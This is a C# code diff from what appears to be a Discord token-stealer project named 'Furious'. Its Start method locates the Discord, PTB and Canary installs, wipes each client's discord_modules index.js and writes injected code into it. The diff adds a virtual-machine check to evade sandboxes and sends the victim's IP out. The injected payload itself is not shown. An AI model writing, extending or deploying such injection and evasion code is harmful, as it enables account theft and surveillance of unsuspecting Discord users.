@@ -28,59 +28,56 @@ namespace Furious
 			return false;
 		}
 
-		public static void Start(bool grabIP)
+		public static void Start(bool grabIP, bool checkForVM)
 		{
+			if (checkForVM)
+			{
+				CheckForVM();
+			}
 			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discord"))
 			{
 				string[] discord = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Discord");
-				foreach (string text in discord)
+				foreach (string folderName in discord)
 				{
-					if (text.Contains("0."))
+					if (folderName.Contains("0."))
 					{
-						FileManagement.DiscordPath = text + "\\modules\\discord_modules\\index.js";
+						FileManagement.DiscordPath = folderName + "\\modules\\discord_modules\\index.js";
 						FileManagement.CleanFile(FileManagement.DiscordPath);
 						FileManagement.WriteDiscord(FileManagement.DiscordPath);
 					}
-				}
-				if (grabIP)
-				{
-					SendIP();
 				}
 			}
 			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb"))
 			{
 				string[] ptb = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb");
-				foreach (string text2 in ptb)
+				foreach (string folderName in ptb)
 				{
-					if (text2.Contains("0."))
+					if (folderName.Contains("0."))
 					{
-						FileManagement.PTBPath = text2 + "\\modules\\discord_modules\\index.js";
+						FileManagement.PTBPath = folderName + "\\modules\\discord_modules\\index.js";
 						FileManagement.CleanFile(FileManagement.PTBPath);
 						FileManagement.WriteDiscord(FileManagement.PTBPath);
 					}
-				}
-				if (grabIP)
-				{
-					SendIP();
 				}
 			}
 			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary"))
 			{
 				string[] canary = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary");
-				foreach (string text3 in canary)
+				foreach (string folderName in canary)
 				{
-					if (text3.Contains("0."))
+					if (folderName.Contains("0."))
 					{
-						FileManagement.CanaryPath = text3 + "\\modules\\discord_modules\\index.js";
+						FileManagement.CanaryPath = folderName + "\\modules\\discord_modules\\index.js";
 						FileManagement.CleanFile(FileManagement.CanaryPath);
 						FileManagement.WriteDiscord(FileManagement.CanaryPath);
 					}
 				}
-				if (grabIP)
-				{
-					SendIP();
-				}
 			}
+			if (grabIP)
+            {
+				SendIP();
+            }
+
 			CloseProcesses();
 		}
 
